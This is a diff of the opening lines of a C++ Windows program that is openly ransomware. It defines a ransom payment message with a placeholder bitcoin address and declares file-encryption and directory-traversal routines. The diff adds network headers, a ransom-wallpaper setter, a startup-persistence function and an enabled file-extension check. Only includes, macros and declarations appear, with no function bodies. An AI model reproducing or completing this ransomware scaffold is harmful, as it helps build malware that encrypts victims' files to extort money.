@@ -1,5 +1,9 @@
-#define WIN32_LEAN_AND_MEAN
+#define VC_EXTRALEAN
 #define _CRT_SECURE_NO_WARNINGS
+
+#ifdef UNICODE
+	#undef UNICODE
+#endif
 
 #include <iostream>
 #include <fstream>
@@ -7,16 +11,28 @@
 #include <string>
 #include <windows.h>
 #include <shellapi.h>
+#include <thread>
+#include <wininet.h>
+#include <comdef.h>
+#include <shlobj.h>
 
-#define AmountOfMoney "100 gazillion gorillion sextillion doubloons"
-#define PaymentInstructions " to [le bitcoin address]."
+#include "wallpaper.hpp"
+
+#define PaymentInstructions "send money to [le bitcoin address]."
 
 FILE* OUTPUT_FILE;
 
 #define debug
-//#define CheckExtension
+#define CheckExtension
 
 extern "C" int RandomGenerator();
 void CryptFile(std::string Path);
 void TraverseDir(std::string Path);
 bool find(const std::string& myString, const std::string& subString);
+static wchar_t* charToWChar(const char* text);
+void  SetWallpaper(LPCWSTR file);
+BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);
+
+
+//global vars
+
